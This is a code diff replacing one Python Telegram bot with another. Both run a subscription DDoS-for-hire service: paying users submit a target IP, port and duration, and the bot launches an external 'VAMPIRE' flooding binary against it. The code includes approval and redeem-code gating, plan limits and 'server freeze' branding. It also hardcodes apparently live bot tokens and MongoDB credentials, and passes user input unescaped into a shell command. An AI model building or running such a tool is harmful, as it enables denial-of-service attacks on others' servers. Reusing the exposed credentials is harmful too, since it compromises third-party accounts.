@@ -1,301 +1,237 @@
-
-import asyncio
-import random
-import string
+import os
+import telebot
+import json
+import requests
 import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
+import time
 from pymongo import MongoClient
-from datetime import datetime, timedelta, timezone
+from datetime import datetime, timedelta
+import certifi
+import asyncio
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from threading import Thread
+import subprocess
 
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
+loop = asyncio.get_event_loop()
 
-MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
-client = MongoClient(MONGO_URI)
-db = client['TEST']
-users_collection = db['VAMPIREXCHEATS']
-redeem_codes_collection = db['redeem_codes0']
+TOKEN = '7908747158:AAHWDbkW2NcLjZydln1-LARsOtfA45_U_fM' #Enter_Bot_Token_within_the_colons'
+MONGO_URI = 'mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb'
+FORWARD_CHANNEL_ID = -1002356645682        # enter the log channel id 
+CHANNEL_ID = -1002356645682          # enter the same id as entered above
+error_channel_id = -1002356645682          # enter the same id 
 
-TELEGRAM_BOT_TOKEN = '7289992579:AAHIXcVEzHAMTFOOPxSZfTOxRfNHcojzRr0'
-ADMIN_USER_ID = 6135948216  
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-cooldown_dict = {}
-user_attack_history = {}
-valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['anxx']
+users_collection = db.users
 
-async def help_command(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        help_text = (
-            "*Here are the commands you can use:* \n\n"
-            "*⚡ /start* - Start interacting with the bot.\n"
-            "*⚡ /attack* - Trigger an attack operation.\n"
-            "*⚡ /redeem* - Redeem a code.\n"
-            "*⚡ /get_id* - Get Your Id?.\n"
-        )
-    else:
-        help_text = (
-            "*☄️ Available Commands for Admins:*\n\n"
-            "*⚡ /start* - Start the bot.\n"
-            "*⚡ /attack* - Start the attack.\n"
-            "*⚡ /get_id* - Get user id.\n"
-            "*⚡ /remove [user_id]* - Remove a user.\n"
-            "*⚡ /users* - List all allowed users.\n"
-            "*⚡ /gen* - Generate a redeem code.\n"
-            "*⚡ /redeem* - Redeem a code.\n"
-        )
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
-    
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  
-    user_name = update.effective_user.first_name  
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! /get_id*", parse_mode='Markdown')
-        return
-    message = (
-       "*🚀ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ıllıllı ULTRA  Universe DɗoS̴ S̴ǝƦƔǝƦ ıllıllı 🚀*\n\n"
-        "*💀Use /attack <ip> <port> <duration>*\n"
-        "*💀ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @ULTRA_GAMER_OP 🚀*" 
-    )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
 
-async def remove_user(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
-        return
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
-        return
-    target_user_id = int(context.args[0])
-    users_collection.delete_one({"user_id": target_user_id})
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-async def is_user_allowed(user_id):
-    user = users_collection.find_one({"user_id": user_id})
-    if user:
-        expiry_date = user['expiry_date']
-        if expiry_date:
-            if expiry_date.tzinfo is None:
-                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
-            if expiry_date > datetime.now(timezone.utc):
-                return True
-    return False
+running_processes = []
 
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
-        return
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
-        return
-    ip, port, duration = args
-    if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
-        return
-    cooldown_period = 0
-    current_time = datetime.now()
-    if user_id in cooldown_dict:
-        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
-        if time_diff < cooldown_period:
-            remaining_time = cooldown_period - int(time_diff)
-            await context.bot.send_message(
-                chat_id=chat_id,
-                text=f"*⏳ Wait for Attack finish {remaining_time}*",
-                parse_mode='Markdown'
-            )
-          #  return
-  #  if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
-    #    await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
-        return
-    cooldown_dict[user_id] = current_time
-    if user_id not in user_attack_history:
-        user_attack_history[user_id] = set()
-    user_attack_history[user_id].add((ip, port))
-    await context.bot.send_message(
-    chat_id=chat_id,
-    text=(
-        f"*💀 ⚠️𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀𝘿!❗ 💀*\n"
-        f"💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇꜰ꜀ᴇᴄᴛ!* 💢\n\n"
-        f"*🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n"
-        f"*⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {duration} seconds*\n"
-        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @ULTRA_GAMER_OP💥*"
-    ), parse_mode='Markdown')
-)
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
 
-async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id 
-    message = f"YOUR USER ID: `{user_id}`" 
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
-
-async def run_attack(chat_id, ip, port, duration, context):
+REMOTE_HOST = '4.213.71.147'  
+async def run_attack_command_on_codespace(target_ip, target_port, duration):
+    command = f"./VAMPIRE {target_ip} {target_port} {duration} 20"
     try:
+       
         process = await asyncio.create_subprocess_shell(
-            f"./VAMPIRE {ip} {port} {duration} 20",
+            command,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
+        running_processes.append(process)
         stdout, stderr = await process.communicate()
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+        output = stdout.decode()
+        error = stderr.decode()
+
+        if output:
+            logging.info(f"Command output: {output}")
+        if error:
+            logging.error(f"Command error: {error}")
+
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+        logging.error(f"Failed to execute command on Codespace: {e}")
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+        if process in running_processes:
+            running_processes.remove(process)
 
-async def generate_redeem_code(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*❌ You are not authorized to generate redeem codes!*", 
-            parse_mode='Markdown'
-        )
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    await run_attack_command_on_codespace(target_ip, target_port, duration)
+
+def is_user_admin(user_id, chat_id):
+    try:
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
+        return False
+
+def check_user_approval(user_id):
+    user_data = users_collection.find_one({"user_id": user_id})
+    if user_data and user_data['plan'] > 0:
+        return True
+    return False
+
+def send_not_approved_message(chat_id):
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')
+
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
+
+    if not is_admin:
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
         return
-    if len(context.args) < 1:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
-            parse_mode='Markdown'
-        )
+
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
         return
-    max_uses = 1
-    custom_code = None
-    time_input = context.args[0]
-    if time_input[-1].lower() in ['d', 'm']:
-        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-    else:
-        custom_code = time_input
-        time_input = context.args[1] if len(context.args) > 1 else None
-        redeem_code = custom_code
-    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id, 
-            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
-            parse_mode='Markdown'
+
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
+
+    if action == '/approve':
+        if plan == 1:  # Instant Plan 🧡
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
+                return
+        elif plan == 2:  # Instant++ Plan 💥
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
+                return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
         )
+        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
+    else:  # disapprove
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    if not check_user_approval(user_id):
+        send_not_approved_message(chat_id)
         return
-    if time_input[-1].lower() == 'd':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
-        expiry_label = f"{time_value} day"
-    elif time_input[-1].lower() == 'm':  
-        time_value = int(time_input[:-1])
-        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
-        expiry_label = f"{time_value} minute"
-    if len(context.args) > (2 if custom_code else 1):
-        try:
-            max_uses = int(context.args[2] if custom_code else context.args[1])
-        except ValueError:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id, 
-                text="*⚠️ Please provide a valid number for max uses.*", 
-                parse_mode='Markdown'
-            )
+
+    try:
+        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
+        bot.register_next_step_handler(message, process_attack_command)
+    except Exception as e:
+        logging.error(f"Error in attack command: {e}")
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*Invalid command format. Please use: Instant++ plan target_ip target_port duration*", parse_mode='Markdown')
             return
-    redeem_codes_collection.insert_one({
-        "code": redeem_code,
-        "expiry_date": expiry_date,
-        "used_by": [], 
-        "max_uses": max_uses,
-        "redeem_count": 0
-    })
-    message = (
-        f"✅ Redeem code generated: `{redeem_code}`\n"
-        f"Expires in {expiry_label}\n"
-        f"Max uses: {max_uses}"
-    )
-    await context.bot.send_message(
-        chat_id=update.effective_chat.id, 
-        text=message, 
-        parse_mode='Markdown'
-    )
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
 
-async def redeem_code(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    if len(context.args) != 1:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
-        return
-    code = context.args[0]
-    redeem_entry = redeem_codes_collection.find_one({"code": code})
-    if not redeem_entry:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
-        return
-    expiry_date = redeem_entry['expiry_date']
-    if expiry_date.tzinfo is None:
-        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-    if expiry_date <= datetime.now(timezone.utc):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
-        return
-    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
-        return
-    if user_id in redeem_entry['used_by']:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
-        return
-    users_collection.update_one(
-        {"user_id": user_id},
-        {"$set": {"expiry_date": expiry_date}},
-        upsert=True
-    )
-    redeem_codes_collection.update_one(
-        {"code": code},
-        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
-    )
-    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
+            return
 
-async def list_users(update, context):
-    current_time = datetime.now(timezone.utc)
-    users = users_collection.find()    
-    user_list_message = "👥 User List:\n" 
-    for user in users:
-        user_id = user['user_id']
-        expiry_date = user['expiry_date']
-        if expiry_date.tzinfo is None:
-            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
-        time_remaining = expiry_date - current_time
-        if time_remaining.days < 0:
-            remaining_days = -0
-            remaining_hours = 0
-            remaining_minutes = 0
-            expired = True  
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
+
+def handle_stop(message):
+    subprocess.run("pkill -f planik", shell=True)
+    time.sleep(2)
+    bot.reply_to(message, "*🛑 Attack stopped...*", parse_mode='Markdown')
+
+@bot.message_handler(commands=['start'])
+def send_welcome(message):
+    # Create a markup object
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+
+    # Create buttons
+    btn1 = KeyboardButton("Stop Attack 🧡")
+    btn2 = KeyboardButton("Instant++ Plan 💥")
+    btn3 = KeyboardButton("Canary Download✔️")
+    btn4 = KeyboardButton("My Account🏦")
+    btn5 = KeyboardButton("Help❓")
+    btn6 = KeyboardButton("Contact admin✔️")
+
+    # Add buttons to the markup
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
+
+    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if not check_user_approval(message.from_user.id):
+        send_not_approved_message(message.chat.id)
+        return
+
+    if message.text == "Stop Attack 🧡":
+          handle_stop(message)
+    elif message.text == "Instant++ Plan 💥":
+        bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
+        attack_command(message)
+    elif message.text == "Canary Download✔️":
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t./2*", parse_mode='Markdown')
+    elif message.text == "My Account🏦":
+        user_id = message.from_user.id
+        user_data = users_collection.find_one({"user_id": user_id})
+        if user_data:
+            username = message.from_user.username
+            plan = user_data.get('plan', 'N/A')
+            valid_until = user_data.get('valid_until', 'N/A')
+            current_time = datetime.now().isoformat()
+            response = (f"*USERNAME: {username}\n"
+                        f"Plan: {plan}\n"
+                        f"Valid Until: {valid_until}\n"
+                        f"Current Time: {current_time}*")
         else:
-            remaining_days = time_remaining.days
-            remaining_hours = time_remaining.seconds // 3600
-            remaining_minutes = (time_remaining.seconds // 60) % 60
-            expired = False      
-        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
-        if expired:
-            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
-        else:
-            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')
+            response = "*No account information found. Please contact the administrator.*"
+        bot.reply_to(message, response, parse_mode='Markdown')
+    elif message.text == "Help❓":
+        bot.reply_to(message, "*Help selected*", parse_mode='Markdown')
+    elif message.text == "Contact admin✔️":
+        bot.reply_to(message, "*Contact admin selected*\n\n @ULTRA_GAMER_OP", parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
-def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("attack", attack))
-    application.add_handler(CommandHandler("gen", generate_redeem_code))
-    application.add_handler(CommandHandler("redeem", redeem_code))
-    application.add_handler(CommandHandler("get_id", VAMPIREXCHEATS))
-    application.add_handler(CommandHandler("users", list_users))
-    application.add_handler(CommandHandler("help", help_command))
-    
-    application.run_polling()
-    logger.info("Bot is running.")
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("Starting Codespace activity keeper and Telegram bot...")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
